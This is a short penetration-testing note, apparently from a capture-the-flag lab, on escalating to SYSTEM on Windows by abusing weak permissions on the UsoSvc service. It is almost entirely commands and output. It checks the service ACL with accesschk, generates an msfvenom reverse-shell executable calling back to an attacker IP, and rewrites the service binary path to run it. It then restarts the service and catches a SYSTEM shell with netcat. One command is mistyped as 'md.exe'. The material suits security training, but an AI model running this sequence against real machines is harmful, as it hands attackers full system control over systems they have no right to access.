# windows UsoSvc service

## Automated possible using PowerUp.ps1.

## Manual

```bash
cmd.exe /c accesschk.exe /accepteula -uqvwqc UsoSvc

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ? 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

UsoSvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\SERVICE
        SERVICE_ALL_ACCESS


sc.exe qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.161 LPORT=7070 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

cmd.exe /c sc config UsoSvc binpath="C:\users\public\documents\rev.exe"
[SC] ChangeServiceConfig SUCCESS

cmd.exe /c sc query UsoSvc
SERVICE_NAME: UsoSvc
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

md.exe /c sc stop UsoSvc

SERVICE_NAME: UsoSvc
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530

cmd.exe /c sc query UsoSvc

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

cmd.exe /c sc start UsoSvc

$ rlwrap nc -lvnp 7070
listening on [any] 7070 ...
connect to [10.10.16.161] from (UNKNOWN) [10.10.10.180] 49726
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
nt authority\system
```
